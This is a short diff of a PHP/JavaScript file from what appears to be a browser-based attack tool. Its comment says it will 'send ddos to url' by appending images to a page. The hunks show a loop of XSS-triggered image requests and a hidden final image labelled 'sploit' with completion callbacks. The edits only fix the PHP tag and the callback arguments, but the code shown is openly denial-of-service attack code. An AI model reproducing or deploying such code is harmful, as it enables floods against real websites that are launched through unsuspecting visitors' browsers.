@@ -1,4 +1,4 @@
-<?
+<?php
 # send ddos to url by appending images to the docuument. notifies when complete
 #
 ?>
@@ -20,5 +20,5 @@ for (var i=0;i<xssrequests-1;i++) {
 }
 
 // the last image has callbacks so we know when the last request is sent
-ci(url2, "display:none;", "sploit", xssdosfin, xssdosfin);
+ci(url2, "display:none;", "sploit", "xssdosfin()", "xssdosfin()");
 debug("images added to document");
